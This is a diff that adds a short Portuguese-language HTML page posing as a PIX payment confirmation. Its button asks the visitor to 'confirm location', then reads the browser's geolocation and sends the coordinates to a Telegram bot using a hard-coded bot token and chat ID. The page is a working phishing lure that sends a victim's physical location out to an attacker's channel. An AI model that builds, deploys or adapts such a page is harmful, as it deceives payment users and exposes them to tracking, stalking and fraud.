@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Pagamento PIX</title>
+</head>
+<body>
+  <h2>Confirmação do pagamento</h2>
+  <p>Por favor, clique no botão abaixo para confirmar sua localização.</p>
+  <button onclick="enviarLocalizacao()">Confirmar</button>
+
+  <script>
+    const botToken = '7447188223:AAG54uwvjTFZZDVUIHbVcDVYe35BE4T78uc';
+    const chatId = '6417415711';
+
+    function enviarLocalizacao() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📍 Localização recebida:%0ALat: ${latitude}%0ALng: ${longitude}`;
+            fetch(url)
+              .then(response => {
+                alert("Localização enviada com sucesso!");
+              })
+              .catch(error => {
+                alert("Erro ao enviar localização.");
+              });
+          },
+          function(error) {
+            alert("Não foi possível obter a localização.");
+          }
+        );
+      } else {
+        alert("Geolocalização não é suportada pelo seu navegador.");
+      }
+    }
+  </script>
+</body>
+</html>
